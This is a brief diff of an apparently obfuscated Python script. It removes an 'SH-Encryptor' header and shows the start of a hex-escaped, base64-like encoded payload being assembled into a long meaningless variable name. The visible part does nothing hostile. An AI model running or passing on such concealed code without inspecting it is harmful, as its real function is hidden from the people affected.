@@ -1,5 +1,4 @@
-# Encrypted by SH-Encryptor
-# Github- https://github.com/ShTasrif
+
 
 pythonpythonpythonpythonpythonpythonpythonpythonpythonpythonpythonpythonpythonpythonpython = ""
 pythonpythonpythonpythonpythonpythonpythonpythonpythonpythonpythonpythonpythonpythonpython += "\x43\x6d\x6c\x74\x63\x47\x39\x79\x64\x43"
